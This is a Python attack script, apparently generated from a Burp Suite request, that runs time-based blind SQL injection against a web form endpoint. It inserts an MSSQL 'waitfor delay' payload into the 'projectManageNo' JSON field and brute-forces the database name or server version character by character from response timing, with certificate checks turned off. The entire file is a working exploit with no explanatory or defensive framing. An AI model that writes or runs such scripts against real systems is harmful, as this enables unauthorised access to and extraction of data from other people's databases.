import requests
import sys
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

 


def extract_data(option):
    if option == "db_name":
        query = "db_name()"
        destination = 25
    else:
        query = "@@version"
        destination = 35

    flag = True
    dictionary = ' 1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
    db_name = ''
    burp0_url = "https://x/it3/st/general/go-form-output/init"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0", "Accept": "application/json", "Accept-Language": "en", "Accept-Encoding": "gzip, deflate", "Authorization": "Bearer ", "Content-Type": "application/json", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
    for i in range(1, destination):
        count = 0
        if flag:
            for char in dictionary:
                burp0_json={
                    "projectManageNo": f"04000007');If substring({query},1,{i})='{db_name}{char}' waitfor delay '0:0:3'--", 
                    "type": "1"
                }
                start_time = time.time()
                response = requests.post(burp0_url, headers=burp0_headers, verify=False, json=burp0_json)
                elapsed_time = time.time() - start_time
                if elapsed_time >= 3 and elapsed_time <= 4:
                    db_name += char
                    break
                else:
                    count += 1
                    if count == 68:
                        flag = False
            print(db_name, end="\r")
        else:
            break
    print(f"\nThe {option} is \"{db_name}\"")        

 


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Extract DB information - X Project")
    parser.add_argument("-o", "--option", help=f"Select between \"db_name\" or \"version\" to retrieve related information", required=True)
    args = parser.parse_args()
    option = args.option
    extract_data(option)
